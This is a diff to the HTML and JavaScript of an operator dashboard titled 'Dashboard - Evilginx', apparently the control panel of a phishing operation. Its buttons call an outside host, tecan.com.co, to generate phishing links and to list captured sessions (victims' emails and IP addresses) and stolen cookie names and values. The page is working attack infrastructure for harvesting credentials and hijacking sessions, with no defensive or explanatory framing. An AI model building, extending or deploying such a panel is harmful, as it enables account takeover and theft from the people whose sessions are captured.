@@ -3,56 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard</title>
-    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <title>Dashboard - Evilginx</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #121212;
+            color: white;
+        }
+        .menu {
+            display: flex;
+            justify-content: space-around;
+            background: #6a11cb;
+            padding: 10px;
+        }
+        .menu button {
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .content {
+            padding: 20px;
+        }
+    </style>
 </head>
-<body class="bg-gray-100">
-    <div class="flex h-screen">
-        <!-- Sidebar -->
-        <aside class="w-64 bg-gray-900 text-white flex flex-col">
-            <div class="p-6 text-center text-2xl font-bold">Dashboard</div>
-            <nav class="flex-grow">
-                <button id="generate-link" class="block w-full px-6 py-3 text-lg hover:bg-gray-700">Generate Link</button>
-                <button id="view-cookies" class="block w-full px-6 py-3 text-lg hover:bg-gray-700">Cookies</button>
-                <button id="view-sessions" class="block w-full px-6 py-3 text-lg hover:bg-gray-700">Captured Sessions</button>
-                <button id="logout" class="block w-full px-6 py-3 text-lg hover:bg-red-700">Logout</button>
-            </nav>
-        </aside>
+<body>
 
-        <!-- Main Content -->
-        <main class="flex-grow p-8">
-            <h1 class="text-3xl font-bold">Welcome to Your Dashboard</h1>
-            <div id="data-display" class="mt-6"></div>
-        </main>
-    </div>
+<div class="menu">
+    <button onclick="generateLink()">Generate Link</button>
+    <button onclick="showSessions()">Captured Sessions</button>
+    <button onclick="showCookies()">Cookies</button>
+    <button onclick="logout()">Logout</button>
+</div>
 
-    <script>
-        document.getElementById("logout").addEventListener("click", () => {
-            firebase.auth().signOut().then(() => {
-                window.location.href = "index.html";
-            });
-        });
+<div class="content" id="content-area">
+    <h2>Welcome to the Dashboard</h2>
+</div>
 
-        document.getElementById("generate-link").addEventListener("click", () => {
-            fetch("http://tecan.com.co/api/generate", { method: "POST" })
-                .then(response => response.json())
-                .then(data => alert("Generated Link: " + data.link))
-                .catch(error => console.error(error));
-        });
+<script>
+    function generateLink() {
+        fetch("http://tecan.com.co/api/generate", { method: "POST" })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("content-area").innerHTML = "<p>Generated Link: " + data.link + "</p>";
+            })
+            .catch(error => console.error("Error:", error));
+    }
 
-        document.getElementById("view-sessions").addEventListener("click", () => {
-            fetch("http://tecan.com.co/api/sessions")
-                .then(response => response.json())
-                .then(data => document.getElementById("data-display").innerHTML = JSON.stringify(data, null, 2))
-                .catch(error => console.error(error));
-        });
+    function showSessions() {
+        fetch("http://tecan.com.co/api/sessions")
+            .then(response => response.json())
+            .then(data => {
+                let content = "<h2>Captured Sessions</h2><ul>";
+                data.sessions.forEach(session => {
+                    content += `<li>${session.email} - ${session.ip}</li>`;
+                });
+                content += "</ul>";
+                document.getElementById("content-area").innerHTML = content;
+            })
+            .catch(error => console.error("Error:", error));
+    }
 
-        document.getElementById("view-cookies").addEventListener("click", () => {
-            fetch("http://tecan.com.co/api/cookies")
-                .then(response => response.json())
-                .then(data => document.getElementById("data-display").innerHTML = JSON.stringify(data, null, 2))
-                .catch(error => console.error(error));
-        });
-    </script>
+    function showCookies() {
+        fetch("http://tecan.com.co/api/cookies")
+            .then(response => response.json())
+            .then(data => {
+                let content = "<h2>Captured Cookies</h2><ul>";
+                data.cookies.forEach(cookie => {
+                    content += `<li>${cookie.name}: ${cookie.value}</li>`;
+                });
+                content += "</ul>";
+                document.getElementById("content-area").innerHTML = content;
+            })
+            .catch(error => console.error("Error:", error));
+    }
+
+    function logout() {
+        window.location.href = "index.html";
+    }
+</script>
+
 </body>
 </html>
